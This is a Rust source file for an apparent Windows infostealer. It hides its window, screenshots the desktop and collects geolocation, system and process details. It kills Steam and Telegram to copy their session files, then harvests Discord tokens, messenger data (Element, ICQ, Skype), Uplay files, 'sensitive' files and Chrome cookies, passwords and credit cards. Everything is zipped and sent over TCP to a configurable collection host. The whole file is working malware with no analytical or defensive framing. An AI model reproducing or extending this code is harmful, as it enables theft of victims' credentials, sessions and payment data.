#![windows_subsystem = "windows"]
use std::io::Cursor;
use std::io::Read;
use std::io::Write;
use std::fs::File;
use std::net::TcpStream;
use std::path::Path;
use std::thread::sleep;
use std::time::Duration;

use chrome_grabber::main::chrome_main;
use screenshots::Screen;
use sysinfo::System;
use zip::write::FileOptions;
use ipgeolocate::Locator;
use ipgeolocate::Service;
use wmi::COMLibrary;
use wmi::WMIConnection;
use zip::CompressionMethod;
use zip::ZipWriter;

mod messengers;
mod other_grabber;
mod chrome_grabber;
mod sender;

static mut PASSWORD: i64 = 1;
static mut CREDIT_CARDS: i64 = 1;

const HOST: &str = "127.0.0.1:12345";

#[tokio::main]

async fn main() {
    let mut binding = Vec::new();
    let buf: Cursor<&mut Vec<u8>> = std::io::Cursor::new(&mut binding);
    let mut writer: ZipWriter<Cursor<&mut Vec<u8>>> = ZipWriter::new(buf);


    let lang = format!("{:?}", whoami::lang().collect::<Vec<String>>());

    let screen = Screen::all().unwrap();
    let mut screen_buf: Vec<u8> = Vec::new();
    for i in screen.iter() {
        screen_buf = i.capture().unwrap().buffer().to_vec();
    }
    add_file_to_archive("Screen.png", &screen_buf, &mut writer).unwrap();

    let city = match Locator::get(&my_internet_ip::get().unwrap().to_string(), Service::IpApi).await {
        Ok(ip) => format!("Country: {}\nCity: {}\nTimezone:{}\nCordinates: {} - {}\n",
        ip.country, ip.city, ip.timezone, ip.latitude, ip.longitude
    ),
    Err(error) => format!("Error: {}", error),
    };
    let mut buf_processes: String = String::new();
    let mut sys_inf_str: String = String::new();
    let processing = sysinfo::System::new_all();
    for process in processing.processes() {
        buf_processes = format!("{}Pid: {}\tName: {}\n", buf_processes, process.0, process.1.name());
    }
    add_file_to_archive("Process.txt", buf_processes.as_bytes(), &mut writer).unwrap();

    let hard = get_hardware();
    sys_inf_str = format!("{}Username: {}\n", sys_inf_str, whoami::username());
    sys_inf_str = format!("{}Name pc: {}\n", sys_inf_str, whoami::devicename());
    sys_inf_str = format!("{}OS: {}\n", sys_inf_str, whoami::distro_os().to_str().unwrap());
    sys_inf_str = format!("{}Lang: {}\n", sys_inf_str, lang);
    sys_inf_str = format!("{}Ip: {}\n", sys_inf_str, my_internet_ip::get().unwrap().to_string().trim());
    sys_inf_str = format!("{}Geo: {}\n", sys_inf_str, city);
    if hard.is_ok() {
        sys_inf_str = format!("{}Hard info: \n{}\n", sys_inf_str, hard.unwrap());
    }
    sys_inf_str = format!("\n\n{}, Hardware info: \nCount cpu: {}", sys_inf_str, processing.cpus().len());

    add_file_to_archive("info.txt", sys_inf_str.as_bytes(), &mut writer).unwrap();

    let steam = other_grabber::steam::steal_steam_session();
    if !steam.is_empty() {
        let sys = System::new_all();
        let proceses_steam: Vec<&str> = vec!["steam.exe", "steamwebhelper.exe"];
        for (_pid, process) in sys.processes().iter() {
            let name = process.name();
            if proceses_steam.contains(&name) {
                process.kill();
                sleep(Duration::from_secs_f32(0.5));
            }
        }
        for path_str in steam.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                let mut file = File::open(path).unwrap();
                let mut buff: Vec<u8> = Vec::new();
                let read = &file.read(&mut buff).unwrap().to_be_bytes();
                add_file_to_archive(format!("Steam/{}", path.file_name().unwrap().to_str().unwrap()).as_str(),read, &mut writer).unwrap();
            }
        }
    }
    let sens_data = other_grabber::sensetive_data::grab_data();
    if !sens_data.is_empty() {
        for path_str in sens_data.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                let mut file = File::open(path).unwrap();
                let mut buff: Vec<u8> = Vec::new();
                let read = &file.read(&mut buff).unwrap().to_be_bytes();
                add_file_to_archive(format!("Sensetive file/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), read, &mut writer).unwrap();
            }
        }
    }
    let telegram_vec: Vec<String> = other_grabber::telegram::steal_telegram();
    if !telegram_vec.is_empty() {
        let sys = System::new_all();
        let processes_tg: Vec<&str> = vec!["Telegram.exe", "Updater.exe"];
        for (_pid, process) in sys.processes() {
            let name = process.name();
            if processes_tg.contains(&name) {
                process.kill();
                sleep(Duration::from_secs_f32(0.5));
            }
        }
        for path_str in telegram_vec.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                let mut file = File::open(path).unwrap();
                let mut buff: Vec<u8> = Vec::new();
                let read = &file.read(&mut buff).unwrap().to_be_bytes();
                add_file_to_archive(format!("Telegram/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), read, &mut writer).unwrap();
            }
        }
        let uplay = other_grabber::uplay::steal_uplay();
        if !uplay.is_empty() {
            for path_str in uplay.iter() {
                let path = Path::new(path_str);
                if path.exists() {
                    if path.is_file() {
                        let mut file = File::open(path).unwrap();
                        let mut buff: Vec<u8> = Vec::new();
                        file.read(&mut buff).unwrap();
                        add_file_to_archive(format!("Uplay/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), &buff, &mut writer).unwrap();
                    }
                }
            }
        }
    }


    let discord_vec = messengers::discord::steal_discord();
    if !discord_vec.is_empty() {
        writer.add_directory("Discord", FileOptions::default()).unwrap();
        let mut buff = String::new();
        for i in discord_vec.iter() {
            buff = format!("{}{}\n", buff, i);
        }
        add_file_to_archive("Discord/Tokens.txt", buff.as_bytes(),&mut writer).unwrap();
    }
    let element_vec = messengers::element::steal_element();
    if !element_vec.is_empty() {
        for path_str in element_vec.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                if path.is_file() {
                    let mut file = File::open(path).unwrap();
                    let mut buff: Vec<u8> = Vec::new();
                    file.read(&mut buff).unwrap();
                    add_file_to_archive(format!("Element/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), &buff, &mut writer).unwrap();
                }
            }
        }
    }
    let icq_vec = messengers::icq::steal_isq();
    if !icq_vec.is_empty() {
        for path_str in icq_vec.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                if path.is_file() {
                    let mut file = File::open(path).unwrap();
                    let mut buff: Vec<u8> = Vec::new();
                    file.read(&mut buff).unwrap();
                    add_file_to_archive(format!("Icq/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), &buff, &mut writer).unwrap();
                }
            }
        }
    }
    let skype_vec = messengers::skype::steal_skype();
    if !skype_vec.is_empty() {
        for path_str in skype_vec.iter() {
            let path = Path::new(path_str);
            if path.exists() {
                if path.is_file() {
                    let mut file = File::open(path).unwrap();
                    let mut buff: Vec<u8> = Vec::new();
                    file.read(&mut buff).unwrap();
                    add_file_to_archive(format!("Skype/{}", path.file_name().unwrap().to_str().unwrap()).as_str(), &buff, &mut writer).unwrap();
                }
            }
        }
    }

    let chrome = chrome_main();
    let s = sender::compact::compact_br_data(chrome);
    if s.get("cookie").unwrap().split_whitespace().count() > 1 {
        add_file_to_archive("Browser/Cookie.txt", s.get("cookie").unwrap().as_bytes(), &mut writer).unwrap();
    }
    if s.get("password").unwrap().split_whitespace().count() > 1 {
        add_file_to_archive("Browser/Password.txt", s.get("password").unwrap().as_bytes(), &mut writer).unwrap();
    }
    if s.get("cc").unwrap().split_whitespace().count() > 1 {
        add_file_to_archive("Browser/Credit card.txt", s.get("cc").unwrap().as_bytes(), &mut writer).unwrap();
    }
    if s.get("app_info").unwrap().split_whitespace().count() > 1 {
        add_file_to_archive("Browser/Browser_names.txt", s.get("app_info").unwrap().as_bytes(), &mut writer).unwrap();
    }
    let mut stream = TcpStream::connect(HOST).unwrap();
    match writer.finish() {
        Ok(cursor) => {
            let buffer = cursor.into_inner();
            send_data(&mut stream, &buffer).unwrap();
        }
        Err(_) => {}
    }

}
fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
    let com_con = COMLibrary::new().unwrap();
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();
    use serde::Deserialize;

    #[allow(non_snake_case, non_camel_case_types)]
    #[derive(Deserialize)]
    struct Win32_Processor {
        Name: String,
    }

    let mut hardware = vec![];

    let results: Vec<Win32_Processor> = wmi_con.query()?;

    for cpu in results {
        hardware.push(format!("{:#?}", cpu.Name));
    }

    #[allow(non_snake_case, non_camel_case_types)]
    #[derive(Deserialize)]
    pub struct Win32_VideoController {
        Caption: String,
        AdapterRAM: i64,
        VideoModeDescription: String,
    }

    let results: Vec<Win32_VideoController> = wmi_con.query()?;

    for video in results {
        hardware.push(format!(
            "{} : {} bytes : {}",
            video.Caption,
            video.AdapterRAM / 1024,
            video.VideoModeDescription
        ));
    }

    return Ok(hardware.join("\n"));
}

fn add_file_to_archive(name: &str, content: &[u8], writer: &mut ZipWriter<std::io::Cursor<&mut Vec<u8>>>) -> zip::result::ZipResult<()> {
    // Начинаем добавление файла в архив
    writer.start_file(name, FileOptions::default().compression_method(CompressionMethod::Stored))?;

    // Записываем содержимое файла
    writer.write_all(content)?;

    Ok(())
}
fn send_data(stream: &mut TcpStream, data: &[u8]) -> std::io::Result<()> {

    stream.write_all(data)?;

    Ok(())
}